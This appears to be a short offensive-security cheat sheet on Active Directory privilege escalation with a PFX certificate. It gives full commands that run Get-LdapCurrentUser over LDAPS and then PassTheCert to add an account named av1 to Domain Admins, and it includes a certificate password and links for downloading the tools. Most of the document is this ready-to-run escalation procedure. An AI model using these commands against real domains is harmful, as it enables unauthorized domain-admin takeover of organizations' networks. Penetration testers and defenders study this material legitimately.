### Got PFX - Now Pass It

**Objective:** Utilize a PFX certificate to interact with LDAP and escalate privileges by adding an account to a domain group.

#### 1. Check Current User via LDAP

Use the `Get-LdapCurrentUser` PowerShell script to check the current LDAP user.

- **Command:**
    ```powershell
    Get-LdapCurrentUser -UseSSL -Server DEG01.test-globalx.com:636 -Certificate C:\Users\admin\Desktop\FourAD\cert.pfx -CertificatePassword sinllaves
    ```

**Steps:**
1. **Download the Script:**
   - Get the script from [Get-LdapCurrentUser.ps1](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1).

2. **Run the Script:**
   - Ensure you have the necessary certificate (`cert.pfx`) and its password (`sinllaves`).
   - Execute the command to verify the current LDAP user.

#### 2. Add Account to Domain Group Using Certificate

Use the `PassTheCert` tool to add an account to a domain group.

- **Command:**
    ```plaintext
    .\PassTheCert.exe --server DEGP001.test-globalx.com --cert-path C:\Users\admin\Desktop\FourAD\cert_msada.pfx --cert-password sinllaves --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=test-globalx,DC=com" --account "CN=av1,OU=Users,OU=Tier 2,OU=FI,OU=Territories,DC=test-globalx,DC=com"
    ```

**Steps:**
1. **Download the Tool:**
   - Obtain the tool from [PassTheCert](https://github.com/AlmondOffSec/PassTheCert).

2. **Prepare the Certificate:**
   - Ensure you have the necessary certificate (`cert_msada.pfx`) and its password (`sinllaves`).

3. **Execute the Command:**
   - Use the command to add the specified account (`av1`) to the target group (`Domain Admins`).

**Summary:**
- The `Get-LdapCurrentUser` script is utilized to verify the current user via LDAP using the provided certificate.
- The `PassTheCert` tool is then employed to add a specified account to a domain group, leveraging the certificate for authentication.
